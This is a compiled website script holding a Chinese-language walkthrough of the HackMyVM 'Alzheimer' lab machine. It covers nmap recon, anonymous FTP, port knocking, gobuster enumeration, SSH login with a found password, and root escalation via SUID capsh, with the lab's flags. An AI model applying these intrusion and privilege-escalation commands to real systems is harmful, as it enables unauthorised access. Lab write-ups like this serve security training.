"use strict";(self.webpackChunkremote_website=self.webpackChunkremote_website||[]).push([[11],{8453:(e,n,r)=>{r.d(n,{R:()=>a,x:()=>c});var s=r(6540);const i={},t=s.createContext(i);function a(e){const n=s.useContext(t);return s.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function c(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(i):e.components||i:a(e.components),s.createElement(t.Provider,{value:n},e.children)}},9814:(e,n,r)=>{r.r(n),r.d(n,{assets:()=>d,contentTitle:()=>c,default:()=>h,frontMatter:()=>a,metadata:()=>s,toc:()=>l});const s=JSON.parse('{"id":"HackMyVm/Machines/Alzheimer","title":"Alzheimer","description":"Alzheimer","source":"@site/docs/HackMyVm/Machines/Alzheimer.md","sourceDirName":"HackMyVm/Machines","slug":"/HackMyVm/Machines/Alzheimer","permalink":"/docs/HackMyVm/Machines/Alzheimer","draft":false,"unlisted":false,"editUrl":"https://github.com/C0rr3c7/C0rr3c7.github.io/tree/master/docs/HackMyVm/Machines/Alzheimer.md","tags":[],"version":"current","frontMatter":{},"sidebar":"HackMyVmSidebar","previous":{"title":"Machines","permalink":"/docs/category/machines"},"next":{"title":"BaseMe","permalink":"/docs/HackMyVm/Machines/BaseMe"}}');var i=r(4848),t=r(8453);const a={},c=void 0,d={},l=[{value:"Alzheimer",id:"alzheimer",level:2},{value:"\u4e3b\u673a\u63a2\u6d4b\u548cnmap\u626b\u63cf",id:"\u4e3b\u673a\u63a2\u6d4b\u548cnmap\u626b\u63cf",level:3},{value:"\u67e5\u770bFTP\u670d\u52a1",id:"\u67e5\u770bftp\u670d\u52a1",level:3},{value:"web\u6e17\u900f",id:"web\u6e17\u900f",level:3},{value:"\u76ee\u5f55\u626b\u63cf",id:"\u76ee\u5f55\u626b\u63cf",level:4},{value:"\u5c1d\u8bd5\u63d0\u6743",id:"\u5c1d\u8bd5\u63d0\u6743",level:3},{value:"suid\u63d0\u6743",id:"suid\u63d0\u6743",level:4}];function o(e){const n={a:"a",blockquote:"blockquote",code:"code",h2:"h2",h3:"h3",h4:"h4",img:"img",p:"p",pre:"pre",...(0,t.R)(),...e.components};return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(n.h2,{id:"alzheimer",children:"Alzheimer"}),"\n",(0,i.jsxs)(n.blockquote,{children:["\n",(0,i.jsx)(n.p,{children:"\u23f2\ufe0f Release Date // 2020-10-03"}),"\n",(0,i.jsx)(n.p,{children:"\u2714\ufe0f MD5 // 181b8e3df47b920d4c9fb00e9e019986"}),"\n",(0,i.jsx)(n.p,{children:"\u2620 Root // 240"}),"\n",(0,i.jsx)(n.p,{children:"\ud83d\udc80 User // 246"}),"\n"]}),"\n",(0,i.jsx)(n.h3,{id:"\u4e3b\u673a\u63a2\u6d4b\u548cnmap\u626b\u63cf",children:"\u4e3b\u673a\u63a2\u6d4b\u548cnmap\u626b\u63cf"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"\u250c\u2500\u2500(root\u327fkali)-[~]\r\n\u2514\u2500# nmap -sn 192.168.56.100/24                   \r\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-25 08:40 EDT\r\nNmap scan report for 192.168.56.100\r\nHost is up (0.00037s latency).\r\nMAC Address: 08:00:27:01:69:57 (Oracle VirtualBox virtual NIC)\r\nNmap scan report for 192.168.56.116\r\nHost is up (0.00015s latency).\r\nMAC Address: 0A:00:27:00:00:1C (Unknown)\r\nNmap scan report for 192.168.56.122\r\nHost is up (0.00062s latency).\r\nMAC Address: 08:00:27:10:58:2B (Oracle VirtualBox virtual NIC)\r\nNmap scan report for 192.168.56.101\r\nHost is up.\r\nNmap done: 256 IP addresses (4 hosts up) scanned in 11.20 seconds\n"})}),"\n",(0,i.jsx)(n.p,{children:"\u9776\u673aip\uff1a192.168.56.122"}),"\n",(0,i.jsx)(n.p,{children:"\u8fdb\u884cTCP\u7684\u5168\u7aef\u53e3\u626b\u63cf"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"nmap -sT --min-rate 10000 -p- 192.168.56.122\n"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-25 08:43 EDT\r\nNmap scan report for 192.168.56.122\r\nHost is up (0.014s latency).\r\nNot shown: 65532 closed tcp ports (conn-refused)\r\nPORT   STATE SERVICE\r\n21/tcp open  ftp\r\n22/tcp open  ssh\r\n80/tcp open  http\r\nMAC Address: 08:00:27:10:58:2B (Oracle VirtualBox virtual NIC)\r\n\r\nNmap done: 1 IP address (1 host up) scanned in 5.88 seconds\n"})}),"\n",(0,i.jsx)(n.p,{children:"\u5f00\u653e21\uff0c22\uff0c80\u7aef\u53e3"}),"\n",(0,i.jsx)(n.p,{children:"\u8fdb\u884c\u8be6\u7ec6\u7aef\u53e3\u7684\u626b\u63cf"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"nmap -sT -sV -sC -O -p21,22,80 192.168.56.122\n"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{children:"PORT   STATE SERVICE VERSION\r\n21/tcp open  ftp     vsftpd 3.0.3\r\n| ftp-syst: \r\n|   STAT: \r\n| FTP server status:\r\n|      Connected to ::ffff:192.168.56.101\r\n|      Logged in as ftp\r\n|      TYPE: ASCII\r\n|      No session bandwidth limit\r\n|      Session timeout in seconds is 300\r\n|      Control connection is plain text\r\n|      Data connections will be plain text\r\n|      At session startup, client count was 1\r\n|      vsFTPd 3.0.3 - secure, fast, stable\r\n|_End of status\r\n|_ftp-anon: Anonymous FTP login allowed (FTP code 230)\r\n22/tcp filtered  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)\r\n| ssh-hostkey: \r\n|   2048 b1:3b:2b:36:e5:6b:d7:2a:6d:ef:bf:da:0a:5d:2d:43 (RSA)\r\n|   256 35:f1:70:ab:a3:66:f1:d6:d7:2c:f7:d1:24:7a:5f:2b (ECDSA)\r\n|_  256 be:15:fa:b6:81:d6:7f:ab:c8:1c:97:a5:ea:11:85:4e (ED25519)\r\n80/tcp open  http    nginx 1.14.2\r\n|_http-server-header: nginx/1.14.2\r\n|_http-title: Site doesn't have a title (text/html).\r\nMAC Address: 08:00:27:10:58:2B (Oracle VirtualBox virtual NIC)\r\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\r\nDevice type: general purpose\r\nRunning: Linux 4.X|5.X\r\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\r\nOS details: Linux 4.15 - 5.8\r\nNetwork Distance: 1 hop\r\nService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n"})}),"\n",(0,i.jsx)(n.p,{children:"21\u7aef\u53e3\u53ef\u4ee5\u533f\u540d\u767b\u5f55\uff0c22\u7aef\u53e3\u662f\u88ab\u8fc7\u6ee4\u7684\u72b6\u6001"}),"\n",(0,i.jsx)(n.h3,{id:"\u67e5\u770bftp\u670d\u52a1",children:"\u67e5\u770bFTP\u670d\u52a1"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"ftp 192.168.56.122\n"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{children:"ftp> ls -lah\r\n229 Entering Extended Passive Mode (|||47700|)\r\n150 Here comes the directory listing.\r\ndrwxr-xr-x    2 0        113          4096 Oct 03  2020 .\r\ndrwxr-xr-x    2 0        113          4096 Oct 03  2020 ..\r\n-rw-r--r--    1 0        0             116 May 25 07:14 .secretnote.txt\r\n226 Directory send OK.\r\nftp> get .secretnote.txt\n"})}),"\n",(0,i.jsxs)(n.p,{children:[(0,i.jsx)(n.code,{children:".secretnote.txt"}),"\u5185\u5bb9"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{children:"I need to knock this ports and \r\none door will be open!\r\n1000\r\n2000\r\n3000\r\nIhavebeenalwayshere!!!\r\nIhavebeenalwayshere!!!\n"})}),"\n",(0,i.jsx)(n.p,{children:"\u9776\u673a\u6709knockd\u670d\u52a1\uff0c\u6211\u4eec\u9700\u8981knock\u6307\u5b9a\u7aef\u53e3\u5f00\u542fssh\u670d\u52a1"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"knock 192.168.56.122 1000 2000 3000\n"})}),"\n",(0,i.jsx)(n.p,{children:"nmap\u518d\u6b21\u626b\u63cf\u53d1\u73b022\u7aef\u53e3\u662f\u5f00\u653e\u72b6\u6001"}),"\n",(0,i.jsx)(n.h3,{id:"web\u6e17\u900f",children:"web\u6e17\u900f"}),"\n",(0,i.jsx)(n.p,{children:"\u8bbf\u95eeweb\u9875\u9762"}),"\n",(0,i.jsxs)(n.blockquote,{children:["\n",(0,i.jsx)(n.p,{children:"I dont remember where I stored my password :( I only remember that was into a .txt file... -medusa"}),"\n"]}),"\n",(0,i.jsxs)(n.p,{children:["\u5f97\u5230\u4e00\u4e2a\u7528\u6237\u540d",(0,i.jsx)(n.code,{children:"medusa"})]}),"\n",(0,i.jsxs)(n.p,{children:["\u53d1\u73b0\u83ab\u65af\u5bc6\u7801\uff0c\u89e3\u5bc6\u5f97\u5230",(0,i.jsx)(n.code,{children:"OTHING"}),"(\u5f88\u53ef\u80fd\u662fSSH\u670d\u52a1\u7684\u5bc6\u7801)"]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240525205824556.png",alt:"image-20240525205824556"})}),"\n",(0,i.jsx)(n.h4,{id:"\u76ee\u5f55\u626b\u63cf",children:"\u76ee\u5f55\u626b\u63cf"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"gobuster dir -u http://192.168.56.122/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt\n"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{children:"===============================================================\r\nStarting gobuster in directory enumeration mode\r\n===============================================================\r\n/home                 (Status: 301) [Size: 185] [--\x3e http://192.168.56.122/home/]\r\n/admin                (Status: 301) [Size: 185] [--\x3e http://192.168.56.122/admin/]\r\n/secret               (Status: 301) [Size: 185] [--\x3e http://192.168.56.122/secret/]\n"})}),"\n",(0,i.jsx)(n.p,{children:"/home\u9875\u9762"}),"\n",(0,i.jsxs)(n.blockquote,{children:["\n",(0,i.jsx)(n.p,{children:"Maybe my pass is at home! -medusa"}),"\n"]}),"\n",(0,i.jsx)(n.p,{children:"/secret\u9875\u9762"}),"\n",(0,i.jsxs)(n.blockquote,{children:["\n",(0,i.jsx)(n.p,{children:"Maybe my password is in this secret folder?"}),"\n"]}),"\n",(0,i.jsxs)(n.p,{children:["\u6d4b\u8bd5ssh\u662f\u5426\u53ef\u4ee5\u767b\u5f55\uff0c\u53d1\u73b0",(0,i.jsx)(n.code,{children:"OTHING"}),"\u4e0d\u662f\u5bc6\u7801\uff0c\u60f3\u5230\u4e0a\u9762\u7684txt\u6587\u4ef6"]}),"\n",(0,i.jsxs)(n.p,{children:["\u53d1\u73b0",(0,i.jsx)(n.code,{children:"Ihavebeenalwayshere!!!"}),"\u662f\u5bc6\u7801"]}),"\n",(0,i.jsxs)(n.p,{children:["\u6210\u529f\u767b\u5f55\u8fdb",(0,i.jsx)(n.code,{children:"medusa"}),"\u7528\u6237"]}),"\n",(0,i.jsxs)(n.blockquote,{children:["\n",(0,i.jsx)(n.p,{children:"HMVrespectmemories"}),"\n"]}),"\n",(0,i.jsx)(n.h3,{id:"\u5c1d\u8bd5\u63d0\u6743",children:"\u5c1d\u8bd5\u63d0\u6743"}),"\n",(0,i.jsx)(n.p,{children:"\u53d1\u73b0\u53ef\u4ee5\u65e0\u5bc6\u7801\u4f7f\u7528id\u547d\u4ee4"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"medusa@alzheimer:~$ sudo -l\r\nMatching Defaults entries for medusa on alzheimer:\r\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\r\n\r\nUser medusa may run the following commands on alzheimer:\r\n    (ALL) NOPASSWD: /bin/id\n"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"medusa@alzheimer:~$ sudo id\r\nuid=0(root) gid=0(root) groups=0(root)\n"})}),"\n",(0,i.jsx)(n.p,{children:"\u641c\u7d22\u4e86\u4e00\u4e0b\u6ca1\u6709\u53d1\u73b0id\u53ef\u4ee5\u600e\u4e48\u63d0\u6743"}),"\n",(0,i.jsx)(n.h4,{id:"suid\u63d0\u6743",children:"suid\u63d0\u6743"}),"\n",(0,i.jsx)(n.p,{children:"\u5bfb\u627e\u6709suid\u6743\u9650\u7684\u6587\u4ef6"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"medusa@alzheimer:~$ find / -type f -perm -4000 2>/dev/null\r\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\r\n/usr/lib/openssh/ssh-keysign\r\n/usr/lib/eject/dmcrypt-get-device\r\n/usr/bin/chsh\r\n/usr/bin/sudo\r\n/usr/bin/mount\r\n/usr/bin/newgrp\r\n/usr/bin/su\r\n/usr/bin/passwd\r\n/usr/bin/chfn\r\n/usr/bin/umount\r\n/usr/bin/gpasswd\r\n/usr/sbin/capsh\n"})}),"\n",(0,i.jsxs)(n.p,{children:["\u5229\u7528",(0,i.jsx)(n.a,{href:"https://gtfobins.github.io/#",children:"GTFOBins"}),"\uff0c\u627e\u5230capsh\u7684\u63d0\u6743\u65b9\u6cd5"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"./capsh --gid=0 --uid=0 --\n"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"medusa@alzheimer:~$ /usr/sbin/capsh --gid=0 --uid=0 --\r\nroot@alzheimer:~# cd /root\r\nroot@alzheimer:/root# cat root.txt \r\nHMVlovememories\n"})}),"\n",(0,i.jsx)(n.p,{children:"\u62ff\u5230root.txt"})]})}function h(e={}){const{wrapper:n}={...(0,t.R)(),...e.components};return n?(0,i.jsx)(n,{...e,children:(0,i.jsx)(o,{...e})}):o(e)}}}]);